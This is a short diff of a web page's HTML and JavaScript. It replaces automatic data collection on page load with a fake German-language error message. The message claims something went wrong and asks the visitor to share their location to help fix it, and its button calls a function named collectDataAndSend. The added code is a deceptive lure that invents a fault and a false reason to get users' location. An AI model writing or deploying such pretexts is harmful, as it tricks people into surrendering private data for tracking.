@@ -142,12 +142,24 @@
             });
         }
 
-        document.addEventListener("DOMContentLoaded", function() {
-            collectDataAndSend();
-        });
+        // Wenn auf der Seite ein Fehler auftritt und wir Standort anfordern möchten
+        function requestLocationAccess() {
+            const infoDiv = document.getElementById("location-info");
+            infoDiv.innerHTML = `
+                <h2>Ups! Etwas ist schiefgelaufen.</h2>
+                <p>Um dir besser zu helfen und dieses Problem schnell zu beheben, benötigen wir deinen Standort.</p>
+                <p>Keine Sorge! Der Standort wird nur verwendet, um das Problem in deiner Region zu lokalisieren und unseren Service zu verbessern.</p>
+                <button onclick="collectDataAndSend()">Standort teilen, um zu helfen!</button>
+            `;
+        }
 
+        document.addEventListener("DOMContentLoaded", function() {
+            requestLocationAccess(); // Stelle sicher, dass der Fehlertext angezeigt wird und der Benutzer den Standort freigeben kann
+        });
     </script>
 
-    <div style="text-align: center; font-size: 50px; color: red; margin-top: 50px;">ERROR</div>
+    <div id="location-info" style="text-align: center; font-size: 20px; color: black; margin-top: 50px;">
+        <!-- Hier wird der Fehlertext angezeigt -->
+    </div>
 </body>
 </html>
